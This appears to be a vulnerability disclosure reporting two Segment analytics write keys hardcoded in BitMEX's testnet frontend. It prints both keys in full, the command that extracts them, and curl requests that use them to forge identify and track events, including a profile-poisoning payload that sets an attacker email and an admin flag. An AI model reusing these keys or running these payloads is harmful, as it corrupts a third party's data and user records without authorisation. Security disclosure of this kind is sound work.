# Exposed and Active Segment Analytics Write Keys

## Summary

Two active Segment.io write keys are hardcoded in the BitMEX testnet frontend JavaScript. Both keys successfully authenticate to the Segment API, allowing an attacker to inject arbitrary analytics events (identify, track, page, group) into BitMEX's Segment workspace, poisoning user profiles and analytics data.

## Severity

**High**

## Affected Asset

- `https://testnet.bitmex.com/` (main page HTML)

## Reproduction Steps

### Step 1: Extract Segment write keys from page source

```bash
curl -s https://testnet.bitmex.com/ | grep -oP 'WRITE_KEY":"[^"]+'
```

Output:
```
WRITE_KEY":"zdUrK1bpag45gVxfXBGnH1Lwuq8e2gtU"
WRITE_KEY":"WBEPZYnIntVV1oXlRx8FxlHvKAfU2FTG"
```

### Step 2: Verify keys are active against Segment API

```bash
# Key 1
curl -s https://api.segment.io/v1/identify \
  -u "zdUrK1bpag45gVxfXBGnH1Lwuq8e2gtU:" \
  -H "Content-Type: application/json" \
  -d '{"userId":"test_verification","traits":{"test":true}}'
# → {"success": true}

# Key 2
curl -s https://api.segment.io/v1/identify \
  -u "WBEPZYnIntVV1oXlRx8FxlHvKAfU2FTG:" \
  -H "Content-Type: application/json" \
  -d '{"userId":"test_verification","traits":{"test":true}}'
# → {"success": true}
```

Both return `{"success": true}`, confirming the keys are valid and active.

## Impact

### 1. User Profile Poisoning
An attacker can call `/v1/identify` with any `userId` to modify user traits in Segment:
```bash
curl -s https://api.segment.io/v1/identify \
  -u "zdUrK1bpag45gVxfXBGnH1Lwuq8e2gtU:" \
  -H "Content-Type: application/json" \
  -d '{"userId":"victim_user_id","traits":{"email":"attacker@evil.com","admin":true}}'
```

### 2. Analytics Data Poisoning
Inject fake track events to corrupt BitMEX's analytics:
```bash
curl -s https://api.segment.io/v1/track \
  -u "zdUrK1bpag45gVxfXBGnH1Lwuq8e2gtU:" \
  -H "Content-Type: application/json" \
  -d '{"userId":"fake","event":"Trade Executed","properties":{"amount":999999}}'
```

### 3. Downstream Destination Abuse
Segment forwards events to configured destinations (email providers, CRMs, data warehouses). Injected events could trigger:
- Unwanted emails to users
- Data corruption in downstream systems
- Billing spikes on usage-based destinations

## Remediation

1. Rotate both Segment write keys immediately
2. Use Segment's server-side tracking instead of client-side write keys for sensitive events
3. Enable Segment's source-level filtering to reject unexpected event types
4. Implement Segment Protocols to validate event schemas
